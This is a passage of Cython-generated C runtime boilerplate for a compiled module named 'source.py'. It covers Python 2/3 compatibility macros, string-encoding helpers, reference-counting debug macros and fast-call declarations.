  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))
#endif
#ifndef PySet_CheckExact
  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)
#endif
#if PY_VERSION_HEX >= 0x030900A4
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)
#else
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)
#endif
#if CYTHON_ASSUME_SAFE_MACROS
  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)
#else
  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyIntObject                  PyLongObject
  #define PyInt_Type                   PyLong_Type
  #define PyInt_Check(op)              PyLong_Check(op)
  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)
  #define PyInt_FromString             PyLong_FromString
  #define PyInt_FromUnicode            PyLong_FromUnicode
  #define PyInt_FromLong               PyLong_FromLong
  #define PyInt_FromSize_t             PyLong_FromSize_t
  #define PyInt_FromSsize_t            PyLong_FromSsize_t
  #define PyInt_AsLong                 PyLong_AsLong
  #define PyInt_AS_LONG                PyLong_AS_LONG
  #define PyInt_AsSsize_t              PyLong_AsSsize_t
  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask
  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask
  #define PyNumber_Int                 PyNumber_Long
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBoolObject                 PyLongObject
#endif
#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY
  #ifndef PyUnicode_InternFromString
    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)
  #endif
#endif
#if PY_VERSION_HEX < 0x030200A4
  typedef long Py_hash_t;
  #define __Pyx_PyInt_FromHash_t PyInt_FromLong
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t
#else
  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))
#else
  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)
#endif
#if CYTHON_USE_ASYNC_SLOTS
  #if PY_VERSION_HEX >= 0x030500B1
    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods
    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)
  #else
    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))
  #endif
#else
  #define __Pyx_PyType_AsAsync(obj) NULL
#endif
#ifndef __Pyx_PyAsyncMethodsStruct
    typedef struct {
        unaryfunc am_await;
        unaryfunc am_aiter;
        unaryfunc am_anext;
    } __Pyx_PyAsyncMethodsStruct;
#endif

#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)
  #if !defined(_USE_MATH_DEFINES)
    #define _USE_MATH_DEFINES
  #endif
#endif
#include <math.h>
#ifdef NAN
#define __PYX_NAN() ((float) NAN)
#else
static CYTHON_INLINE float __PYX_NAN() {
  float value;
  memset(&value, 0xFF, sizeof(value));
  return value;
}
#endif
#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)
#define __Pyx_truncl trunc
#else
#define __Pyx_truncl truncl
#endif

#define __PYX_MARK_ERR_POS(f_index, lineno) \
    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }
#define __PYX_ERR(f_index, lineno, Ln_error) \
    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }

#ifndef __PYX_EXTERN_C
  #ifdef __cplusplus
    #define __PYX_EXTERN_C extern "C"
  #else
    #define __PYX_EXTERN_C extern
  #endif
#endif

#define __PYX_HAVE__source
#define __PYX_HAVE_API__source
/* Early includes */
#ifdef _OPENMP
#include <omp.h>
#endif /* _OPENMP */

#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)
#define CYTHON_WITHOUT_ASSERTIONS
#endif

typedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;
                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;

#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)
#define __PYX_DEFAULT_STRING_ENCODING ""
#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString
#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#define __Pyx_uchar_cast(c) ((unsigned char)c)
#define __Pyx_long_cast(x) ((long)x)
#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\
    (sizeof(type) < sizeof(Py_ssize_t))  ||\
    (sizeof(type) > sizeof(Py_ssize_t) &&\
          likely(v < (type)PY_SSIZE_T_MAX ||\
                 v == (type)PY_SSIZE_T_MAX)  &&\
          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\
                                v == (type)PY_SSIZE_T_MIN)))  ||\
    (sizeof(type) == sizeof(Py_ssize_t) &&\
          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\
                               v == (type)PY_SSIZE_T_MAX)))  )
static CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {
    return (size_t) i < (size_t) limit;
}
#if defined (__cplusplus) && __cplusplus >= 201103L
    #include <cstdlib>
    #define __Pyx_sst_abs(value) std::abs(value)
#elif SIZEOF_INT >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) abs(value)
#elif SIZEOF_LONG >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) labs(value)
#elif defined (_MSC_VER)
    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define __Pyx_sst_abs(value) llabs(value)
#elif defined (__GNUC__)
    #define __Pyx_sst_abs(value) __builtin_llabs(value)
#else
    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);
#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))
#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)
#define __Pyx_PyBytes_FromString        PyBytes_FromString
#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);
#if PY_MAJOR_VERSION < 3
    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#else
    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize
#endif
#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)
#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)
#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)
#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)
#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)
static CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {
    const Py_UNICODE *u_end = u;
    while (*u_end++) ;
    return (size_t)(u_end - u - 1);
}
#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))
#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode
#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode
#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)
#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);
#define __Pyx_PySequence_Tuple(obj)\
    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);
#if CYTHON_ASSUME_SAFE_MACROS
#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))
#else
#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)
#endif
#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))
#else
#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))
#endif
#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
static int __Pyx_sys_getdefaultencoding_not_ascii;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    PyObject* ascii_chars_u = NULL;
    PyObject* ascii_chars_b = NULL;
    const char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    if (strcmp(default_encoding_c, "ascii") == 0) {
        __Pyx_sys_getdefaultencoding_not_ascii = 0;
    } else {
        char ascii_chars[128];
        int c;
        for (c = 0; c < 128; c++) {
            ascii_chars[c] = c;
        }
        __Pyx_sys_getdefaultencoding_not_ascii = 1;
        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);
        if (!ascii_chars_u) goto bad;
        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);
        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {
            PyErr_Format(
                PyExc_ValueError,
                "This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.",
                default_encoding_c);
            goto bad;
        }
        Py_DECREF(ascii_chars_u);
        Py_DECREF(ascii_chars_b);
    }
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    Py_XDECREF(ascii_chars_u);
    Py_XDECREF(ascii_chars_b);
    return -1;
}
#endif
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)
#else
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
static char* __PYX_DEFAULT_STRING_ENCODING;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);
    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;
    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    return -1;
}
#endif
#endif


/* Test for GCC > 2.95 */
#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))
  #define likely(x)   __builtin_expect(!!(x), 1)
  #define unlikely(x) __builtin_expect(!!(x), 0)
#else /* !__GNUC__ or GCC < 2.95 */
  #define likely(x)   (x)
  #define unlikely(x) (x)
#endif /* __GNUC__ */
static CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }

static PyObject *__pyx_m = NULL;
static PyObject *__pyx_d;
static PyObject *__pyx_b;
static PyObject *__pyx_cython_runtime = NULL;
static PyObject *__pyx_empty_tuple;
static PyObject *__pyx_empty_bytes;
static PyObject *__pyx_empty_unicode;
static int __pyx_lineno;
static int __pyx_clineno = 0;
static const char * __pyx_cfilenm= __FILE__;
static const char *__pyx_filename;


static const char *__pyx_f[] = {
  "source.py",
};

/*--- Type declarations ---*/

/* --- Runtime support code (head) --- */
/* Refnanny.proto */
#ifndef CYTHON_REFNANNY
  #define CYTHON_REFNANNY 0
#endif
#if CYTHON_REFNANNY
  typedef struct {
    void (*INCREF)(void*, PyObject*, int);
    void (*DECREF)(void*, PyObject*, int);
    void (*GOTREF)(void*, PyObject*, int);
    void (*GIVEREF)(void*, PyObject*, int);
    void* (*SetupContext)(const char*, int, const char*);
    void (*FinishContext)(void**);
  } __Pyx_RefNannyAPIStruct;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);
  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;
#ifdef WITH_THREAD
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          if (acquire_gil) {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
              PyGILState_Release(__pyx_gilstate_save);\
          } else {\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
          }
#else
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)
#endif
  #define __Pyx_RefNannyFinishContext()\
          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)
  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)
  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)
  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)
  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)
#else
  #define __Pyx_RefNannyDeclarations
  #define __Pyx_RefNannySetupContext(name, acquire_gil)
  #define __Pyx_RefNannyFinishContext()
  #define __Pyx_INCREF(r) Py_INCREF(r)
  #define __Pyx_DECREF(r) Py_DECREF(r)
  #define __Pyx_GOTREF(r)
  #define __Pyx_GIVEREF(r)
  #define __Pyx_XINCREF(r) Py_XINCREF(r)
  #define __Pyx_XDECREF(r) Py_XDECREF(r)
  #define __Pyx_XGOTREF(r)
  #define __Pyx_XGIVEREF(r)
#endif
#define __Pyx_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_XDECREF(tmp);\
    } while (0)
#define __Pyx_DECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_DECREF(tmp);\
    } while (0)
#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)
#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)

/* PyObjectGetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)
#endif

/* GetBuiltinName.proto */
static PyObject *__Pyx_GetBuiltinName(PyObject *name);

/* PyDictVersioning.proto */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)
#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\
    (version_var) = __PYX_GET_DICT_VERSION(dict);\
    (cache_var) = (value);
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\
        (VAR) = __pyx_dict_cached_value;\
    } else {\
        (VAR) = __pyx_dict_cached_value = (LOOKUP);\
        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\
    }\
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);
#else
#define __PYX_GET_DICT_VERSION(dict)  (0)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);
#endif

/* GetModuleGlobalName.proto */
#if CYTHON_USE_DICT_VERSIONS
#define __Pyx_GetModuleGlobalName(var, name)  do {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\
        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\
        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\
    PY_UINT64_T __pyx_dict_version;\
    PyObject *__pyx_dict_cached_value;\
    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);
#else
#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);
#endif

/* decode_c_string_utf16.proto */
static CYTHON_INLINE PyObject *__Pyx_PyUnicode_DecodeUTF16(const char *s, Py_ssize_t size, const char *errors) {
    int byteorder = 0;
    return PyUnicode_DecodeUTF16(s, size, errors, &byteorder);
}
static CYTHON_INLINE PyObject *__Pyx_PyUnicode_DecodeUTF16LE(const char *s, Py_ssize_t size, const char *errors) {
    int byteorder = -1;
    return PyUnicode_DecodeUTF16(s, size, errors, &byteorder);
}
static CYTHON_INLINE PyObject *__Pyx_PyUnicode_DecodeUTF16BE(const char *s, Py_ssize_t size, const char *errors) {
    int byteorder = 1;
    return PyUnicode_DecodeUTF16(s, size, errors, &byteorder);
}

/* decode_c_bytes.proto */
static CYTHON_INLINE PyObject* __Pyx_decode_c_bytes(
         const char* cstring, Py_ssize_t length, Py_ssize_t start, Py_ssize_t stop,
         const char* encoding, const char* errors,
         PyObject* (*decode_func)(const char *s, Py_ssize_t size, const char *errors));

/* decode_bytes.proto */
static CYTHON_INLINE PyObject* __Pyx_decode_bytes(
         PyObject* string, Py_ssize_t start, Py_ssize_t stop,
         const char* encoding, const char* errors,
         PyObject* (*decode_func)(const char *s, Py_ssize_t size, const char *errors)) {
    return __Pyx_decode_c_bytes(
        PyBytes_AS_STRING(string), PyBytes_GET_SIZE(string),
        start, stop, encoding, errors, decode_func);
}

/* PyCFunctionFastCall.proto */
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject *__Pyx_PyCFunction_FastCall(PyObject *func, PyObject **args, Py_ssize_t nargs);
#else
#define __Pyx_PyCFunction_FastCall(func, args, nargs)  (assert(0), NULL)
#endif

/* PyFunctionFastCall.proto */
#if CYTHON_FAST_PYCALL
#define __Pyx_PyFunction_FastCall(func, args, nargs)\
    __Pyx_PyFunction_FastCallDict((func), (args), (nargs), NULL)
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs);
#else
#define __Pyx_PyFunction_FastCallDict(func, args, nargs, kwargs) _PyFunction_FastCallDict(func, args, nargs, kwargs)
#endif
#define __Pyx_BUILD_ASSERT_EXPR(cond)\
    (sizeof(char [1 - 2*!(cond)]) - 1)
#ifndef Py_MEMBER_SIZE
#define Py_MEMBER_SIZE(type, member) sizeof(((type *)0)->member)
#endif
#if CYTHON_FAST_PYCALL
  static size_t __pyx_pyframe_localsplus_offset = 0;
  #include "frameobject.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
  #define __Pxy_PyFrame_Initialize_Offsets()\
    ((void)__Pyx_BUILD_ASSERT_EXPR(sizeof(PyFrameObject) == offsetof(PyFrameObject, f_localsplus) + Py_MEMBER_SIZE(PyFrameObject, f_localsplus)),\
     (void)(__pyx_pyframe_localsplus_offset = ((size_t)PyFrame_Type.tp_basicsize) - Py_MEMBER_SIZE(PyFrameObject, f_localsplus)))
  #define __Pyx_PyFrame_GetLocalsplus(frame)\
    (assert(__pyx_pyframe_localsplus_offset), (PyObject **)(((char *)(frame)) + __pyx_pyframe_localsplus_offset))
#endif // CYTHON_FAST_PYCALL
#endif

/* PyObjectCall.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);
#else
#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)
#endif

/* PyObjectCallMethO.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg);
#endif

/* PyObjectCallOneArg.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg);

/* PyObjectCall2Args.proto */
static CYTHON_UNUSED PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2);

/* PyObjectSetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
#define __Pyx_PyObject_DelAttrStr(o,n) __Pyx_PyObject_SetAttrStr(o, n, NULL)
static CYTHON_INLINE int __Pyx_PyObject_SetAttrStr(PyObject* obj, PyObject* attr_name, PyObject* value);
#else
#define __Pyx_PyObject_DelAttrStr(o,n)   PyObject_DelAttr(o,n)
#define __Pyx_PyObject_SetAttrStr(o,n,v) PyObject_SetAttr(o,n,v)
#endif

/* PyObjectCallNoArg.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func);
#else
#define __Pyx_PyObject_CallNoArg(func) __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL)
#endif

/* PyObjectFormatSimple.proto */
#if CYTHON_COMPILING_IN_PYPY
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        PyObject_Format(s, f))
#elif PY_MAJOR_VERSION < 3
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        likely(PyString_CheckExact(s)) ? PyUnicode_FromEncodedObject(s, NULL, "strict") :\
        PyObject_Format(s, f))
#elif CYTHON_USE_TYPE_SLOTS
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        likely(PyLong_CheckExact(s)) ? PyLong_Type.tp_str(s) :\
        likely(PyFloat_CheckExact(s)) ? PyFloat_Type.tp_str(s) :\
        PyObject_Format(s, f))
#else
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        PyObject_Format(s, f))
#endif

/* IncludeStringH.proto */
#include <string.h>

/* JoinPyUnicode.proto */
static PyObject* __Pyx_PyUnicode_Join(PyObject* value_tuple, Py_ssize_t value_count, Py_ssize_t result_ulength,
                                      Py_UCS4 max_char);

/* RaiseArgTupleInvalid.proto */
static void __Pyx_RaiseArgtupleInvalid(const char* func_name, int exact,
    Py_ssize_t num_min, Py_ssize_t num_max, Py_ssize_t num_found);

/* RaiseDoubleKeywords.proto */
static void __Pyx_RaiseDoubleKeywordsError(const char* func_name, PyObject* kw_name);

/* ParseKeywords.proto */
static int __Pyx_ParseOptionalKeywords(PyObject *kwds, PyObject **argnames[],\
    PyObject *kwds2, PyObject *values[], Py_ssize_t num_pos_args,\
    const char* function_name);

/* GetTopmostException.proto */
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem * __Pyx_PyErr_GetTopmostException(PyThreadState *tstate);
#endif

/* PyThreadStateGet.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;
#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;
#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type
#else
#define __Pyx_PyThreadState_declare
#define __Pyx_PyThreadState_assign
#define __Pyx_PyErr_Occurred()  PyErr_Occurred()
#endif

/* SaveResetException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_ExceptionSave(type, value, tb)  __Pyx__ExceptionSave(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#define __Pyx_ExceptionReset(type, value, tb)  __Pyx__ExceptionReset(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
#else
#define __Pyx_ExceptionSave(type, value, tb)   PyErr_GetExcInfo(type, value, tb)
#define __Pyx_ExceptionReset(type, value, tb)  PyErr_SetExcInfo(type, value, tb)
#endif

/* PyErrExceptionMatches.proto */
#if CYTHON_FAST_THREAD_STATE
